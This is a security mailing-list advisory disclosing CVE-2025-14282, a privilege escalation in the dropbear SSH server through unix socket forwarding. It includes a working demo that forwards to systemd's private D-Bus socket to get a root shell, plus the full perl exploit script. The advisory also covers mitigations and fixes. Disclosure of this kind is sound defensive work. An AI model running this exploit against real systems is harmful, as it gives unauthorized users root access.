Received: (qmail 22260 invoked by uid 550); 16 Dec 2025 16:11:55 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 14308 invoked from network); 16 Dec 2025 14:27:13 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1765895223; x=1766500023; darn=lists.openwall.com;
        h=content-disposition:mime-version:subject:to:from:date:message-id
         :from:to:cc:subject:date:message-id:reply-to;
        bh=rGc1h33d1Nwc35QhuTsSem71QrhxTtU5+fSLvpHhTCo=;
        b=Zh/gc8G/g3OqAyswisdZ0ioUjIRKAPLniF/f2zxUW1szGcrDDZdLBkRz0vjc76BqCC
         5kc9xFPM7D44sZw9UpbTp5yFQn5dkP/JF9x9H3rHtJpniuQnS6f/dXZjSqOsGSEzyBsl
         xcO1J7EEWF4HaQC9LQbjciKYmn7QUQgrpGrctyIPhN4l5f2PyVi9sbjf/KMXN+F+8X1p
         RLrrzNt/Zw7rQxsxoU6o0oSPnL7gZIDqHU10bjUXMiwk6US7zheXGJDMiUAoFwHOc/L9
         +jUg1PZzh3NfQrNgju2pZBL/Mlo8lB54D0Qpa3Wvrw/1zDRkLYmYK8f/DhIaeSn6AuZJ
         dyEA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1765895223; x=1766500023;
        h=content-disposition:mime-version:subject:to:from:date:message-id
         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to;
        bh=rGc1h33d1Nwc35QhuTsSem71QrhxTtU5+fSLvpHhTCo=;
        b=VMnpD8UGT2h3M6huDDWLVN4anAD14Jp4WCv1ltGvCIRDRpGJBZIZdHTLja4SZ5eBst
         sPhYhds0vvH8Fev4l3b4MNpRdaIr0OIzqdyVz8lULhGz6zmwNC1EEJMRQBp/Zdw8HU8x
         cbFH1NVKki2md/FCfaBikTNrmPa1PxgeRkGh+Lg+CHCdEc0XNP0Vbq48VKfmJ1ynUoBt
         jtTKUc1Nc6b9o0JaBpMhNWD0MDiELY4CleVwuSDj+rDO8UA3bF9PrY/VoYhxVWWRa9j7
         JUOJtCVzt9bzd8eHWXkpqXoj3nRIWCQfTeS0JMw9ThIqYdYJG4xJTUMfvcKFbpUlLjn2
         60hQ==
X-Gm-Message-State: AOJu0YxcHqjVFMS8YKyEwakOXsqVmZdRyV7B1/vbLm5xNk06lcveZ5Dj
	gtdy1YwTMmUpu2sXjS2XURXIvFUvZLV9vg19TKRiCsqyWQJn/Fcz7UmFxzC+fA==
X-Gm-Gg: AY/fxX4DXdVOvqfupXTy2U/ThC3tcF2mXxbYou5JiaZrEnqQF73SHpcvYMNHy+EI0Id
	t8EMVnCSemwD/ZCTd3BrKs99790jNeCIKAAk6np49SKpvxK+e0dTsn7TR4uSloie2lnj5Shvm85
	uVXR+sEo7P5d2Fmr5fmQgkWOugZTYXSP9t9XDO6h0+USC5yFqTkJMntsrpaphh6wmeNEj8+7FI1
	Q43CQrNGkvJSyAG1mZHe6L6JnaHWAxRXix0LrdI++vkYwxyfeluWoa1M8h7zCz0F+Iq/AdszJeF
	uTHivolT2MImicTl45FpRjzikHKPQL3Ah3RtS2smxcP1DR3OLtlCEWTvDIOe2n/Nm9zQGokz3zT
	XcolK4iW1o+lY1JvM8gIcPuFhW3X448ly0SAfbPgGl942DM+i93g+dZEfOn0Fj4ryG78DCSpElG
	HrVuSU/wFfHGA=
X-Google-Smtp-Source: AGHT+IHIV5hMzs5+3Y7hd5WJWQz2clXlCURVrwpNIIT0NVD+NWkGrNWYkFeEn80wkfCd+4naldvZ+w==
X-Received: by 2002:a05:600c:1c2a:b0:477:6d96:b3c8 with SMTP id 5b1f17b1804b1-47a8f905313mr160151435e9.23.1765895223229;
        Tue, 16 Dec 2025 06:27:03 -0800 (PST)
Message-ID: <68b13971a63c33c7a18c8c236d0b4b23.d2701554@milliner.nutritionists>
Date: Tue, 16 Dec 2025 16:27:01 +0200
From: turistu@gmail.com
To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Subject: [oss-security] [CVE-2025-14282] dropbear: privilege escalation via unix domain
 socket forwardings

[ this is a slightly edited version of the original report send to
  distros@ on December 4.  I would also post it at:
  https://github.com/turistu/odds-n-ends/blob/main/CVE-2025-14282.md
  Any further corrections and clarifications will go there ]

When running in multi-user mode and authenticating users, the dropbear
ssh server does the socket forwardings (as all the other operations
requested by the remote client) as root, only switching to the logged-in
user upon spawning a shell or --temporarily-- while doing some operations
like reading the user's files.

That was quite bad even with tcp sockets [1], but with the recent ability
of also using unix domain sockets as the forwarding destination [2],
it got much worse: any user able to log in via ssh can connect to any
unix socket with the root's credentials, bypassing both file system
restrictions and any SO_PEERCRED / SO_PASSCRED checks performed by the peer.

And on most systems that could be easily used to get a root shell [3].

### DEMO

Here
- 'trixie' is a current debian system with dropbear installed and
   configured to listen on port 222 [4],
- 'luser' is non sudo-able, regular user who can login via ssh and perform
   socket forwardings (allowed by default),
- 'systemd-run.pl' is a perl script which packs up a dbus message and
   writes it to a unix domain socket (get it from the end of this email).

   -- from one terminal

$ rm ~/sock; ssh -L ~/sock:/run/systemd/private -t -p 222 luser@trixie sleep 71d

  -- from another terminal

$ perl systemd-run.pl ~/sock \
   't=/proc/$(pgrep -f "^sleep 71d")/fd/1; script /dev/null -qc bash <$t >$t'

  -- back to the first terminal

root@trixie:/# _


### POSSIBLE WORKAROUNDS, FIXES

A temporary workaround is to disable any forwardings (whether tcp, unix,
x11, agent, etc) by default and instruct the users to run the server
in single-user mode and enable them explicitly if they want to use
those features.

The real fix is to irrevocably setuid/gid/groups to the logged-in user's
credentials as soon as possible, before performing any forwardings or
reading any user files. Contrary to various claims, root is not (really)
needed either for creating pseuto terminals, writing utmp records or
pam session management.

In particular, switching uids back and forth (as the current code does
for some operations[5]) is *not* a proper fix, since the peer may rely
on SO_PASSCRED checking, and those checks are performed upon each *read*,
not just upon accepting a connection.

### NOTES

[1] https://github.com/turistu/dropbearx/commit/cfb81a0 (in my fork of
dropbear). That kludge was woefully inadequate, as it was only doing
the uid switch upon binding, not upon connecting or resolving hostnames,
and it was only switching the uids, not the gids and the groups too.

[2] https://github.com/mkj/dropbear/commit/1d5f63c

[3] Yes, that means that even with openssh, a user may bypass their own
login shell (and any ForceCommand or authorized_keys command="..."
restrictions) and run whatever commands they like, but only under their
*own* credentials. Example (where user 'foo' has uid '1001'):

$ rm -f ~/sock; ssh -fNL ~/sock:/run/user/1001/systemd/private foo@trixie
foo@trixie's password:
$ perl systemd-run.pl ~/sock /bin/mkdir mkdir -p '/tmp/xx/$(literally&)'
...
root@trixie:/# ls -ld /tmp/xx/*
drwxrwxr-x 2 foo foo 40 Dec 16 09:32 '/tmp/xx/$(literally&)'

This example assumes that sshd runs with UsePAM=yes (the default on debian).

But this dbus/systemd thing is only meant as illustration; there are plenty
of other ways to (ab)use this; in particular, xwayland / recent linux distros
have gutted the X11 cookie auth, only relying on "si:localuser" (i.e. on
SO_PEERCRED checks) for authentication.

[4] http://cloud.debian.org/images/cloud/trixie/daily/20251215-2327/debian-13-nocloud-amd64-daily-20251215-2327.qcow2
You can change the default port in /etc/default/dropbear

[5] see https://github.com/mkj/dropbear/blob/7b8e47a7/src/svr-agentfwd.c#L155
Notice that even after the setegid(), 0 may *still* be part of the
*supplementary* groups (and it usually really is ;-)) and so that
code will use any perms offered by gid 0. Same goes for svr-authpubkey.c#L473.

-----------x------------- systemd-run.pl -----------x-----------
#! /usr/bin/perl
use strict;

my ($peer, @cmd) = @ARGV ? @ARGV : qw(/run/systemd/private date);
use IO::Socket::UNIX;
my $sock = new IO::Socket::UNIX ($peer) or die "connect: $peer: $!";
$/ = "\r\n";
syswrite $sock, join $/, "\0AUTH EXTERNAL", "DATA", "BEGIN", "";
while(1){ die "unexpected EOF" unless defined ($_ = <$sock>); last if /^OK / }
@cmd = ('/usr/bin/sh', 'sh', '-c', @cmd) if @cmd == 1;
syswrite $sock, pack_dbus(q{
	&y 108 1 4 1
	&u ?len 1
	&a(yv) {
		&r  &y 1  &vo /org/freedesktop/systemd1
		&r  &y 3  &vs StartTransientUnit
		&r  &y 2  &vs org.freedesktop.systemd1.Manager
		&r  &y 6  &vs org.freedesktop.systemd1
		&r  &y 8  &vg ssa(sv)a(sa(sv))
	}
	&r
    &t=.
	&s ["run-".int(rand 1<<32).".service"]
	&s fail
	&a(sv) {
		&r &s ExecStart
		   &va(sasb) {
			&r &s [[ $cmd[0] ]]
			   &as { &s [[ @cmd[1..$#cmd] ]] }
			   &b 0
		   }
	}
	&a(sa(sv))
    &len=.-t
});

package packer {
	sub TIEHASH { my $p = shift; bless {'', \$_[0]}, $p }
	sub FETCH { $_[0]{$_[1]}{v} }
	sub STORE {
		my $v = $_[0]{$_[1]}{v} = $_[2]; my $h = $_[0]{$_[1]};
		substr ${$_[0]{''}}, $$h{o}, $$h{l}, pack $$h{s}, $v if $$h{l};
		$v
	}
	sub pack {
		my $d = shift->{''}; my $s = shift; $$d = pack "a* $s", $$d, @_
	}
}
my (%ts, $ts); BEGIN {
	sub{while(@_){
		$ts{$_}=["x!$_[1]", $_[2]] for split '', $_[0]; splice @_, 0, 3
	}}->(qw[
		y    1 C
		ubh  4 L
		so   4 L/a*x
		g    1 C/a*x
		re({ 8 a0
		a    4 a0
		i 4 l  n 2 s  q 2 S  x 8 q  t 8 Q  d 8 d
	]);
	$ts = qr/[@{[keys %ts]}]/;
}
sub pack_dbus {
	@_ = map /(?{pos})\[+(?{(pos)-$^R}).*?(?:(??{"\\]"x$^R})|$)|\S+/gs, @_;
	my $p = tie my %h, packer => my $d;
	my @o;
	while(@_){
		if(($_ = shift) eq '}'){
			my $o = pop @o or die "unbalanced '}'";
			substr $d, $$o[0], 4, pack 'L', length($d) - $$o[1];
			next
		}
		die "unexpected token '$_'" unless s/^&//;
		if(/=/){
			s/([a-z]\w*)/(\$h{$1})/gi, s/\./(length\$d)/g;
			defined($_ = eval) or die "$_: $@";
			next
		}
		my $vt = s/^v&?// ? 'C/a*x' : 'a0';
		if(/^a($ts)/){
			$p->pack("$vt x!4", $_); my $o = length $d;
			$p->pack("L $ts{$1}[0]");
			shift, push @o, [$o, length $d] if $_[0] eq '{';
			next;
		}
		$p->pack("$vt x!8", $_), next if $_ eq 'r';
		die "no such type $_" unless /^$ts$/;
		my ($t, @t) = ($_, @{$ts{$_}});
		while(@_ and $_[0] !~ /^[&}]/){
			if(($_ = shift) =~ s/^\?//){
				$p->pack("$vt $t[0]", $t); my $o = length $d;
				$p->pack("x[$t[1]]");
				$$p{$_} = { s => $t[1], o => $o,
						l => length($d) - $o }
			}elsif(/^\[/){
				s/^\[+|\]+$//g;
				defined(my @v = eval) or die "$_: $@";
				$p->pack("$vt @t", $t, $_) for @v;
			}else{
				$p->pack("$vt @t", $t, $_);
			}
		}
	}
	$d
}
